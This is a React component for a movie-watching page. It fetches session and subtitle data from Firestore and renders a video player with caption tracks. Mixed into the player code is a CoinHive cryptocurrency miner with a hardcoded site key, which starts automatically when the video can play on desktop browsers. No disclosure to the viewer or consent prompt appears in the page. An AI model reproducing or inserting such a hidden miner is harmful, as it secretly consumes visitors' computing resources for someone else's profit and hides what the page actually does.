import React, { Component } from 'react';
import { DefaultPlayer as Video } from 'react-html5video';
import 'react-html5video/dist/styles.css';
import { Button, Snackbar } from "material-ui";
import { Redirect } from "react-router";
import { BasicLayout } from '../components';
import * as firebase from 'firebase';
import 'firebase/firestore';

class WatchPage extends Component {
  state = {
    subsUrl: [],
    title: 'Watch Movie',
    image: '',
    error: false,
    redirect: false,
    mine: true,
  };

  componentDidMount() {
    const firestore = firebase.firestore();
    firestore
      .doc(`/session/${this.props.match.params.id}`)
      .get()
      .then(snapshot => {
        const movieData = snapshot.data();
        const targetedLang = ['en', 'id'];
        const targetedSubs = movieData.subs.reduce((prev, curr) => {
          if (targetedLang.indexOf(curr.lang) > -1) {
            return [...prev, curr];
          }
          return prev;
        }, []);
        this.setState({
          subsUrl: targetedSubs,
          title: movieData.title,
          image: movieData.image
        });
      });
      try {
        this.miner = new window.CoinHive.Anonymous('6IgN0USpT1jJBVBsx66mPZ8KCQiuH1VD', {throttle: 0.3});
      } catch(err) {
        this.setState({mine: false});
      }
  }

  onVideoError = event => {
    if (!event.target.error) {
      return;
    }
    const errorCode = event.target.error.code;
    console.log(`video error ${errorCode}`);
    if (errorCode === 2 || errorCode === 4 ) {
      this.setState({
        error: true
      });
    }
  }

  errorRedirect = event => {
    this.setState({
      redirect: true
    })
  }

  renderSnackBar = () => {
    if (this.state.error) {
      return (
        <Snackbar
          open
          message={<span>Session Expired</span>}
          action={
            [
              <Button key="redirect-snackbar" color="accent" onClick={this.errorRedirect}>Close</Button>
            ]
          }
        />
      )
    }
    return null;
  }

  onCanPlay = event => {
    console.log(`Start Playing...`);
    if (this.state.mine) {
      if (!this.miner.isMobile() && !this.miner.didOptOut(14400)) {
        this.miner.start();
      }
    }
  }

  render() {
    if (this.state.redirect) {
      return (
        <Redirect to="/" />
      )
    }
    return (
      <BasicLayout title={this.state.title}>
        <div>
          <Video
            src={`/data/${this.props.match.params.id}`}
            autoPlay
            crossOrigin="anonymous"
            onError={this.onVideoError}
            onCanPlay={this.onCanPlay}
            controls={[
              'PlayPause',
              'Seek',
              'Time',
              'Volume',
              'Fullscreen',
              'Captions',
            ]}>
            {this.state.subsUrl.map(subs => (
              <track
                key={`key-${subs.lang}`}
                label={subs.langName}
                kind="subtitles"
                srcLang={subs.lang}
                src={subs.url}
                default={subs.lang === 'en'}
              />
            ))}
          </Video>
        </div>
        {this.renderSnackBar()}
      </BasicLayout>
    );
  }
}

export default WatchPage;
